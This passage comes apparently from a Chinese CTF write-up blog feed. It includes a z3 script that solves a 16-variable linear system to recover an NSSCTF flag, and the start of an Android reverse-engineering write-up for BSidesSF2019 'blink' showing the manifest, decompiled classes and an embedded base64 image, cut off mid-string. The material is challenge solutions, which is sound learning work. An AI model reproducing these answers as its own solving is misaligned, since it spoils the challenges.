<span class="number">198</span>,</span><br><span class="line">        <span class="number">234</span>,</span><br><span class="line">        <span class="number">162</span>,</span><br><span class="line">        <span class="number">218</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">164</span>,</span><br><span class="line">        <span class="number">164</span>,</span><br><span class="line">        <span class="number">209</span>,</span><br><span class="line">        <span class="number">200</span>,</span><br><span class="line">        <span class="number">168</span>,</span><br><span class="line">        <span class="number">226</span>,</span><br><span class="line">        <span class="number">189</span>,</span><br><span class="line">        <span class="number">151</span>,</span><br><span class="line">        <span class="number">253</span>,</span><br><span class="line">        <span class="number">241</span>,</span><br><span class="line">        <span class="number">232</span>,</span><br><span class="line">        <span class="number">151</span>,</span><br><span class="line">        <span class="number">193</span>,</span><br><span class="line">        <span class="number">119</span>,</span><br><span class="line">        <span class="number">226</span>,</span><br><span class="line">        <span class="number">193</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">151</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">249</span>,</span><br><span class="line">        <span class="number">148</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">218</span>,</span><br><span class="line">        <span class="number">222</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">228</span>,</span><br><span class="line">        <span class="number">100</span>,</span><br><span class="line">        <span class="number">206</span>,</span><br><span class="line">        <span class="number">218</span>,</span><br><span class="line">        <span class="number">177</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">217</span>,</span><br><span class="line">        <span class="number">202</span>,</span><br><span class="line">        <span class="number">126</span>,</span><br><span class="line">        <span class="number">214</span>,</span><br><span class="line">        <span class="number">195</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">144</span>,</span><br><span class="line">        <span class="number">105</span>,</span><br><span class="line">        <span class="number">152</span>,</span><br><span class="line">        <span class="number">118</span>,</span><br><span class="line">        <span class="number">167</span>,</span><br><span class="line">        <span class="number">137</span>,</span><br><span class="line">        <span class="number">171</span>,</span><br><span class="line">        <span class="number">173</span>,</span><br><span class="line">        <span class="number">206</span>,</span><br><span class="line">        <span class="number">240</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">160</span>,</span><br><span class="line">        <span class="number">134</span>,</span><br><span class="line">        <span class="number">131</span>,</span><br><span class="line">        <span class="number">135</span>,</span><br><span class="line">        <span class="number">186</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">146</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">139</span>,</span><br><span class="line">        <span class="number">174</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        <span class="number">177</span>,</span><br><span class="line">        <span class="number">240</span>,</span><br><span class="line">        <span class="number">194</span>,</span><br><span class="line">        <span class="number">181</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">183</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">127</span>,</span><br><span class="line">        <span class="number">136</span>,</span><br><span class="line">        <span class="number">136</span>,</span><br><span class="line">        <span class="number">209</span>,</span><br><span class="line">        <span class="number">199</span>,</span><br><span class="line">        <span class="number">191</span>,</span><br><span class="line">        <span class="number">150</span>,</span><br><span class="line">        <span class="number">218</span>,</span><br><span class="line">        <span class="number">160</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">191</span>,</span><br><span class="line">        <span class="number">226</span>,</span><br><span class="line">        <span class="number">154</span>,</span><br><span class="line">        <span class="number">191</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">247</span>,</span><br><span class="line">        <span class="number">188</span>,</span><br><span class="line">        <span class="number">210</span>,</span><br><span class="line">        <span class="number">219</span>,</span><br><span class="line">        <span class="number">179</span>,</span><br><span class="line">        <span class="number">204</span>,</span><br><span class="line">        <span class="number">155</span>,</span><br><span class="line">        <span class="number">220</span>,</span><br><span class="line">        <span class="number">215</span>,</span><br><span class="line">        <span class="number">127</span>,</span><br><span class="line">        <span class="number">225</span>,</span><br><span class="line">        <span class="number">214</span>,</span><br><span class="line">        <span class="number">195</span>,</span><br><span class="line">        <span class="number">162</span>,</span><br><span class="line">        <span class="number">214</span>,</span><br><span class="line">        <span class="number">239</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">108</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">133</span>,</span><br><span class="line">        <span class="number">178</span>,</span><br><span class="line">        <span class="number">138</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">176</span>,</span><br><span class="line">        <span class="number">232</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">193</span>,</span><br><span class="line">        <span class="number">239</span>,</span><br><span class="line">        <span class="number">131</span>,</span><br><span class="line">        <span class="number">138</span>,</span><br><span class="line">        <span class="number">161</span>,</span><br><span class="line">        <span class="number">218</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">140</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">142</span>,</span><br><span class="line">        <span class="number">181</span>,</span><br><span class="line">        <span class="number">179</span>,</span><br><span class="line">        <span class="number">173</span>,</span><br><span class="line">        <span class="number">203</span>,</span><br><span class="line">        <span class="number">208</span>,</span><br><span class="line">        <span class="number">184</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">119</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">152</span>,</span><br><span class="line">        <span class="number">186</span>,</span><br><span class="line">        <span class="number">124</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">105</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">142</span>,</span><br><span class="line">        <span class="number">175</span>,</span><br><span class="line">        <span class="number">184</span>,</span><br><span class="line">        <span class="number">234</span>,</span><br><span class="line">        <span class="number">119</span>,</span><br><span class="line">        <span class="number">195</span>,</span><br><span class="line">        <span class="number">218</span>,</span><br><span class="line">        <span class="number">141</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">202</span>,</span><br><span class="line">        <span class="number">202</span>,</span><br><span class="line">        <span class="number">190</span>,</span><br><span class="line">        <span class="number">178</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">183</span>,</span><br><span class="line">        <span class="number">178</span>,</span><br><span class="line">        <span class="number">256</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">241</span>,</span><br><span class="line">        <span class="number">132</span>,</span><br><span class="line">        <span class="number">163</span>,</span><br><span class="line">        <span class="number">209</span>,</span><br><span class="line">        <span class="number">204</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">175</span>,</span><br><span class="line">        <span class="number">211</span>,</span><br><span class="line">        <span class="number">196</span>,</span><br><span class="line">        <span class="number">136</span>,</span><br><span class="line">        <span class="number">158</span>,</span><br><span class="line">        <span class="number">210</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">224</span>,</span><br><span class="line">        <span class="number">144</span>,</span><br><span class="line">        <span class="number">189</span>,</span><br><span class="line">        <span class="number">106</span>,</span><br><span class="line">        <span class="number">177</span>,</span><br><span class="line">        <span class="number">251</span>,</span><br><span class="line">        <span class="number">206</span>,</span><br><span class="line">        <span class="number">163</span>,</span><br><span class="line">        <span class="number">167</span>,</span><br><span class="line">        <span class="number">144</span>,</span><br><span class="line">        <span class="number">208</span>,</span><br><span class="line">        <span class="number">254</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">253</span>,</span><br><span class="line">        <span class="number">100</span>,</span><br><span class="line">        <span class="number">106</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">251</span>,</span><br><span class="line">        <span class="number">251</span>,</span><br><span class="line">        <span class="number">136</span>,</span><br><span class="line">        <span class="number">170</span>,</span><br><span class="line">        <span class="number">145</span>,</span><br><span class="line">        <span class="number">177</span>,</span><br><span class="line">        <span class="number">175</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">193</span>,</span><br><span class="line">        <span class="number">188</span>,</span><br><span class="line">        <span class="number">193</span>,</span><br><span class="line">        <span class="number">198</span>,</span><br><span class="line">        <span class="number">208</span>,</span><br><span class="line">        <span class="number">171</span>,</span><br><span class="line">        <span class="number">151</span>,</span><br><span class="line">        <span class="number">230</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">143</span>,</span><br><span class="line">        <span class="number">200</span>,</span><br><span class="line">        <span class="number">143</span>,</span><br><span class="line">        <span class="number">150</span>,</span><br><span class="line">        <span class="number">243</span>,</span><br><span class="line">        <span class="number">148</span>,</span><br><span class="line">        <span class="number">136</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">161</span>,</span><br><span class="line">        <span class="number">224</span>,</span><br><span class="line">        <span class="number">170</span>,</span><br><span class="line">        <span class="number">208</span>,</span><br><span class="line">        <span class="number">185</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">189</span>,</span><br><span class="line">        <span class="number">242</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">234</span>,</span><br><span class="line">        <span class="number">188</span>,</span><br><span class="line">        <span class="number">226</span>,</span><br><span class="line">        <span class="number">194</span>,</span><br><span class="line">        <span class="number">248</span>,</span><br><span class="line">        <span class="number">168</span>,</span><br><span class="line">        <span class="number">250</span>,</span><br><span class="line">        <span class="number">244</span>,</span><br><span class="line">        <span class="number">166</span>,</span><br><span class="line">        <span class="number">106</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">218</span>,</span><br><span class="line">        <span class="number">209</span>,</span><br><span class="line">        <span class="number">220</span>,</span><br><span class="line">        <span class="number">158</span>,</span><br><span class="line">        <span class="number">228</span>]]</span><br><span class="line">r = [</span><br><span class="line">    <span class="number">472214</span>,</span><br><span class="line">    <span class="number">480121</span>,</span><br><span class="line">    <span class="number">506256</span>,</span><br><span class="line">    <span class="number">449505</span>,</span><br><span class="line">    <span class="number">433390</span>,</span><br><span class="line">    <span class="number">435414</span>,</span><br><span class="line">    <span class="number">453899</span>,</span><br><span class="line">    <span class="number">536361</span>,</span><br><span class="line">    <span class="number">423332</span>,</span><br><span class="line">    <span class="number">427624</span>,</span><br><span class="line">    <span class="number">440268</span>,</span><br><span class="line">    <span class="number">488759</span>,</span><br><span class="line">    <span class="number">469049</span>,</span><br><span class="line">    <span class="number">484574</span>,</span><br><span class="line">    <span class="number">480266</span>,</span><br><span class="line">    <span class="number">522818</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">f=Solver()</span><br><span class="line">flag=[Int(<span class="string">f&#x27;flag[<span class="subst">&#123;i&#125;</span>]&#x27;</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	v = <span class="number">0</span></span><br><span class="line">	str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">		v += co[i][j] * flag[j]</span><br><span class="line">		</span><br><span class="line">	f.add(v==r[i])</span><br><span class="line">str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">if</span>(f.check()==sat):</span><br><span class="line">		m=f.model()</span><br><span class="line">		str1+=<span class="built_in">str</span>(m[flag[i]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NSSCTF&#123;ISEC-&quot;</span>+md5(str1.encode())+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>BSidesSF2019blink</title>
    <url>/2023/06/07/CTF%20WP/Re/%E5%AE%89%E5%8D%93/BSidesSF2019blink/</url>
    <content><![CDATA[<p>BSidesSF2019blink</p>
<p>观察其xml文件，有两个activity组件，相当于代表了两个主类会被运行</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.blink&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;15&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;27&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme.NoActionBar&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_r2d2&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.blink.r2d2&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.blink.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>为下图的MainActivity类和r2d2类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306071402993.png"
                      alt="image-20230607140224956"
                ></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity类</span></span><br><span class="line"><span class="keyword">package</span> com.example.blink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.SupportActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//r2d2类</span></span><br><span class="line"><span class="keyword">package</span> com.example.blink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.graphics.BitmapFactory;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: E:\EDGE下载\classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">r2d2</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.SupportActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_r2d2);</span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">image</span> <span class="operator">=</span> (ImageView) findViewById(R.id.imageView);</span><br><span class="line">        <span class="type">String</span> <span class="variable">imageString</span> <span class="operator">=</span> <span class="string">&quot; data:image/jpeg;base64,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